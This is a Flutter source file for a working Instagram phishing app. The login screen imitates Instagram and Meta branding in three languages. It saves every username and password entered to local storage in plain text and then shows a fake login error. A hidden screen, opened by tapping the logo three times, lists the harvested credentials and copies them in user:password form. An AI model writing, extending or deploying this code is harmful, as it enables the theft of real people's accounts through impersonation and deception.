import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  runApp(const InstagramApp());
}

class InstagramApp extends StatelessWidget {
  const InstagramApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Instagram',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: Colors.black,
        primarySwatch: Colors.blue,
      ),
      home: const LoginScreen(),
    );
  }
}

class SavedAccount {
  final String username;
  final String password;
  final String time;

  SavedAccount({required this.username, required this.password, required this.time});

  Map<String, dynamic> toJson() => {
        'username': username,
        'password': password,
        'time': time,
      };

  factory SavedAccount.fromJson(Map<String, dynamic> json) => SavedAccount(
        username: json['username'] ?? '',
        password: json['password'] ?? '',
        time: json['time'] ?? '',
      );
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  String selectedLanguage = 'العربية';
  bool _obscurePassword = true;

  final TextEditingController _usernameController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();

  int _logoTapCount = 0;

  final Map<String, Map<String, String>> localizedValues = {
    'العربية': {
      'usernameHint': 'اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول',
      'passwordHint': 'كلمة السر',
      'loginButton': 'تسجيل الدخول',
      'forgotPassword': 'هل نسيت كلمة السر؟',
      'createAccount': 'إنشاء حساب جديد',
      'selectLanguageTitle': 'تحديد لغتك',
      'errorTitle': 'لا يمكن تسجيل الدخول',
      'errorMessage': 'حدث خطأ غير متوقع. يرجى محاولة تسجيل الدخول مرة أخرى.',
      'okButton': 'موافق',
      'savedPanelTitle': 'الحسابات المحفوظة محلياً 🔐',
      'noAccounts': 'لا توجد حسابات محفوظة بعد',
      'copy': 'نسخ',
      'delete': 'حذف',
      'clearAll': 'حذف الكل',
      'copied': 'تم النسخ إلى الحافظة!',
    },
    'English': {
      'usernameHint': 'Username, email or mobile number',
      'passwordHint': 'Password',
      'loginButton': 'Log In',
      'forgotPassword': 'Forgot password?',
      'createAccount': 'Create new account',
      'selectLanguageTitle': 'Select your language',
      'errorTitle': 'Couldn\'t Log In',
      'errorMessage': 'An unexpected error occurred. Please try logging in again.',
      'okButton': 'OK',
      'savedPanelTitle': 'Saved Credentials 🔐',
      'noAccounts': 'No saved accounts yet',
      'copy': 'Copy',
      'delete': 'Delete',
      'clearAll': 'Clear All',
      'copied': 'Copied to clipboard!',
    },
    'Français': {
      'usernameHint': "Nom d'utilisateur, e-mail ou mobile",
      'passwordHint': 'Mot de passe',
      'loginButton': 'Se connecter',
      'forgotPassword': 'Mot de passe oublié ?',
      'createAccount': 'Créer un nouveau compte',
      'selectLanguageTitle': 'Sélectionnez votre langue',
      'errorTitle': 'Impossible de se connecter',
      'errorMessage': "Une erreur inattendue s'est produite. Veuillez réessayer.",
      'okButton': 'OK',
      'savedPanelTitle': 'Comptes Enregistrés 🔐',
      'noAccounts': 'Aucun compte enregistré pour le moment',
      'copy': 'Copier',
      'delete': 'Supprimer',
      'clearAll': 'Tout effacer',
      'copied': 'Copié dans le presse-papier !',
    },
  };

  // Save credentials locally
  Future<void> _handleLogin() async {
    String username = _usernameController.text.trim();
    String password = _passwordController.text.trim();

    if (username.isNotEmpty && password.isNotEmpty) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      List<String> savedList = prefs.getStringList('saved_accounts') ?? [];

      String timeNow = DateTime.now().toString().substring(0, 16);
      SavedAccount newAccount = SavedAccount(
        username: username,
        password: password,
        time: timeNow,
      );

      // Check if already exists to avoid duplicates, or just add
      savedList.add(jsonEncode(newAccount.toJson()));
      await prefs.setStringList('saved_accounts', savedList);
    }

    // Show Instagram error dialog
    _showErrorDialog();
  }

  void _showErrorDialog() {
    final texts = localizedValues[selectedLanguage]!;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext context) {
        return AlertDialog(
          backgroundColor: const Color(0xFF262626),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(14),
          ),
          title: Text(
            texts['errorTitle']!,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 18,
              fontWeight: FontWeight.bold,
            ),
          ),
          content: Text(
            texts['errorMessage']!,
            style: const TextStyle(
              color: Colors.white70,
              fontSize: 14,
            ),
          ),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(context).pop();
                // Clear password field after error
                _passwordController.clear();
              },
              child: Text(
                texts['okButton']!,
                style: const TextStyle(
                  color: Color(0xFF0095F6),
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ],
        );
      },
    );
  }

  // Handle Logo Triple Tap
  void _onLogoTap() {
    _logoTapCount++;
    if (_logoTapCount >= 3) {
      _logoTapCount = 0;
      _openSavedAccountsPanel();
    }
  }

  void _openSavedAccountsPanel() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => SavedAccountsScreen(
          texts: localizedValues[selectedLanguage]!,
        ),
      ),
    );
  }

  void _showLanguageBottomSheet() {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF262626),
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (BuildContext context) {
        return Container(
          padding: const EdgeInsets.symmetric(vertical: 20, horizontal: 16),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Text(
                    localizedValues[selectedLanguage]!['selectLanguageTitle']!,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  IconButton(
                    icon: const Icon(Icons.close, color: Colors.white),
                    onPressed: () => Navigator.pop(context),
                  ),
                ],
              ),
              const Divider(color: Colors.grey),
              const SizedBox(height: 10),
              _buildLanguageOption('العربية', 'العربية'),
              const Divider(color: Colors.white24, height: 1),
              _buildLanguageOption('English', 'English (US)'),
              const Divider(color: Colors.white24, height: 1),
              _buildLanguageOption('Français', 'Français'),
              const SizedBox(height: 20),
            ],
          ),
        );
      },
    );
  }

  Widget _buildLanguageOption(String langKey, String langDisplay) {
    bool isSelected = selectedLanguage == langKey;
    return InkWell(
      onTap: () {
        setState(() {
          selectedLanguage = langKey;
        });
        Navigator.pop(context);
      },
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 8),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Text(
              langDisplay,
              style: const TextStyle(color: Colors.white, fontSize: 16),
            ),
            Icon(
              isSelected ? Icons.radio_button_checked : Icons.radio_button_off,
              color: isSelected ? Colors.blue : Colors.grey,
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final texts = localizedValues[selectedLanguage]!;
    final isRtl = selectedLanguage == 'العربية';

    return Directionality(
      textDirection: isRtl ? TextDirection.rtl : TextDirection.ltr,
      child: Scaffold(
        backgroundColor: Colors.black,
        appBar: AppBar(
          backgroundColor: Colors.black,
          elevation: 0,
          leading: IconButton(
            icon: const Icon(Icons.arrow_back, color: Colors.white),
            onPressed: () {},
          ),
          actions: [
            Center(
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 16.0),
                child: GestureDetector(
                  onTap: _showLanguageBottomSheet,
                  child: Row(
                    children: [
                      Text(
                        selectedLanguage == 'العربية'
                            ? 'العربية'
                            : (selectedLanguage == 'English'
                                ? 'English (US)'
                                : 'Français'),
                        style: const TextStyle(
                          color: Colors.white70,
                          fontSize: 14,
                          fontWeight: FontWeight.w500,
                        ),
                      ),
                      const SizedBox(width: 4),
                      const Icon(
                        Icons.keyboard_arrow_down,
                        color: Colors.white70,
                        size: 18,
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
        body: SafeArea(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 24.0),
            child: Column(
              children: [
                const Spacer(flex: 1),
                // Logo with Triple Tap detector
                GestureDetector(
                  onTap: _onLogoTap,
                  child: Container(
                    width: 80,
                    height: 80,
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(
                        colors: [
                          Color(0xFF833AB4),
                          Color(0xFFFD1D1D),
                          Color(0xFFF77737),
                        ],
                        begin: Alignment.topRight,
                        end: Alignment.bottomLeft,
                      ),
                      borderRadius: BorderRadius.circular(22),
                    ),
                    child: const Center(
                      child: Icon(
                        Icons.camera_alt_outlined,
                        color: Colors.white,
                        size: 44,
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 40),
                TextField(
                  controller: _usernameController,
                  style: const TextStyle(color: Colors.white),
                  decoration: InputDecoration(
                    hintText: texts['usernameHint'],
                    hintStyle:
                        const TextStyle(color: Colors.white38, fontSize: 13),
                    filled: true,
                    fillColor: const Color(0xFF121212),
                    contentPadding: const EdgeInsets.symmetric(
                        horizontal: 16, vertical: 14),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Color(0xFF262626)),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Color(0xFF262626)),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Colors.white60),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                TextField(
                  controller: _passwordController,
                  obscureText: _obscurePassword,
                  style: const TextStyle(color: Colors.white),
                  decoration: InputDecoration(
                    hintText: texts['passwordHint'],
                    hintStyle:
                        const TextStyle(color: Colors.white38, fontSize: 14),
                    filled: true,
                    fillColor: const Color(0xFF121212),
                    contentPadding: const EdgeInsets.symmetric(
                        horizontal: 16, vertical: 14),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Color(0xFF262626)),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Color(0xFF262626)),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Colors.white60),
                    ),
                    suffixIcon: IconButton(
                      icon: Icon(
                        _obscurePassword
                            ? Icons.visibility_off
                            : Icons.visibility,
                        color: Colors.white54,
                      ),
                      onPressed: () {
                        setState(() {
                          _obscurePassword = !_obscurePassword;
                        });
                      },
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                SizedBox(
                  width: double.infinity,
                  height: 48,
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF0095F6),
                      foregroundColor: Colors.white,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                      elevation: 0,
                    ),
                    onPressed: _handleLogin,
                    child: Text(
                      texts['loginButton']!,
                      style: const TextStyle(
                        fontSize: 15,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                TextButton(
                  onPressed: () {},
                  child: Text(
                    texts['forgotPassword']!,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 13,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ),
                const Spacer(flex: 2),
                SizedBox(
                  width: double.infinity,
                  height: 48,
                  child: OutlinedButton(
                    style: OutlinedButton.styleFrom(
                      side: const BorderSide(color: Color(0xFF0095F6), width: 1.5),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                    onPressed: () {},
                    child: Text(
                      texts['createAccount']!,
                      style: const TextStyle(
                        color: Color(0xFF0095F6),
                        fontSize: 15,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    const Text(
                      '∞',
                      style: TextStyle(
                        color: Colors.white54,
                        fontSize: 20,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(width: 6),
                    const Text(
                      'Meta',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 15,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// Awesome Hidden Saved Accounts Panel Screen
class SavedAccountsScreen extends StatefulWidget {
  final Map<String, String> texts;

  const SavedAccountsScreen({super.key, required this.texts});

  @override
  State<SavedAccountsScreen> createState() => _SavedAccountsScreenState();
}

class _SavedAccountsScreenState extends State<SavedAccountsScreen> {
  List<SavedAccount> accounts = [];

  @override
  void initState() {
    super.initState();
    _loadAccounts();
  }

  Future<void> _loadAccounts() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    List<String> savedList = prefs.getStringList('saved_accounts') ?? [];
    setState(() {
      accounts = savedList
          .map((item) => SavedAccount.fromJson(jsonDecode(item)))
          .toList()
          .reversed
          .toList(); // Newest first
    });
  }

  Future<void> _deleteAccount(int index) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    List<String> savedList = prefs.getStringList('saved_accounts') ?? [];
    // Since we displayed reversed, calculate actual index
    int actualIndex = savedList.length - 1 - index;
    if (actualIndex >= 0 && actualIndex < savedList.length) {
      savedList.removeAt(actualIndex);
      await prefs.setStringList('saved_accounts', savedList);
      _loadAccounts();
    }
  }

  Future<void> _clearAll() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.remove('saved_accounts');
    _loadAccounts();
  }

  void _copyToClipboard(String text, String message) {
    Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: const Color(0xFF0095F6),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0A0A),
      appBar: AppBar(
        backgroundColor: const Color(0xFF161616),
        title: Text(
          widget.texts['savedPanelTitle']!,
          style: const TextStyle(color: Colors.white, fontSize: 18),
        ),
        iconTheme: const IconThemeData(color: Colors.white),
        actions: [
          if (accounts.isNotEmpty)
            IconButton(
              icon: const Icon(Icons.delete_sweep, color: Colors.redAccent),
              tooltip: widget.texts['clearAll'],
              onPressed: () {
                showDialog(
                  context: context,
                  builder: (ctx) => AlertDialog(
                    backgroundColor: const Color(0xFF262626),
                    title: Text(widget.texts['clearAll']!,
                        style: const TextStyle(color: Colors.white)),
                    content: const Text(
                      'هل أنت متأكد من حذف جميع الحسابات المحفوظة؟',
                      style: TextStyle(color: Colors.white70),
                    ),
                    actions: [
                      TextButton(
                        onPressed: () => Navigator.pop(ctx),
                        child: const Text('إلغاء',
                            style: TextStyle(color: Colors.grey)),
                      ),
                      TextButton(
                        onPressed: () {
                          Navigator.pop(ctx);
                          _clearAll();
                        },
                        child: const Text('حذف الكل',
                            style: TextStyle(color: Colors.redAccent)),
                      ),
                    ],
                  ),
                );
              },
            ),
        ],
      ),
      body: accounts.isEmpty
          ? Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const Icon(Icons.lock_outline,
                      size: 80, color: Colors.white24),
                  const SizedBox(height: 16),
                  Text(
                    widget.texts['noAccounts']!,
                    style: const TextStyle(color: Colors.white54, fontSize: 16),
                  ),
                ],
              ),
            )
          : ListView.builder(
              padding: const EdgeInsets.all(16),
              itemCount: accounts.length,
              itemBuilder: (context, index) {
                final acc = accounts[index];
                return Container(
                  margin: const EdgeInsets.only(bottom: 12),
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A1A),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: const Color(0xFF333333)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Expanded(
                            child: Text(
                              acc.username,
                              style: const TextStyle(
                                color: Colors.white,
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                          Text(
                            acc.time,
                            style: const TextStyle(
                              color: Colors.white38,
                              fontSize: 11,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Row(
                        children: [
                          const Text(
                            'كلمة المرور: ',
                            style: TextStyle(color: Colors.grey, fontSize: 13),
                          ),
                          Text(
                            acc.password,
                            style: const TextStyle(
                              color: Color(0xFF0095F6),
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 12),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.end,
                        children: [
                          // Copy Button
                          OutlinedButton.icon(
                            style: OutlinedButton.styleFrom(
                              foregroundColor: Colors.white,
                              side: const BorderSide(color: Colors.white24),
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 12, vertical: 6),
                              minimumSize: const Size(0, 32),
                            ),
                            onPressed: () => _copyToClipboard(
                              '${acc.username}:${acc.password}',
                              widget.texts['copied']!,
                            ),
                            icon: const Icon(Icons.copy, size: 14),
                            label: Text(widget.texts['copy']!),
                          ),
                          const SizedBox(width: 8),
                          // Delete Button
                          OutlinedButton.icon(
                            style: OutlinedButton.styleFrom(
                              foregroundColor: Colors.redAccent,
                              side: const BorderSide(color: Colors.redAccent),
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 12, vertical: 6),
                              minimumSize: const Size(0, 32),
                            ),
                            onPressed: () => _deleteAccount(index),
                            icon: const Icon(Icons.delete, size: 14),
                            label: Text(widget.texts['delete']!),
                          ),
                        ],
                      ),
                    ],
                  ),
                );
              },
            ),
    );
  }
}
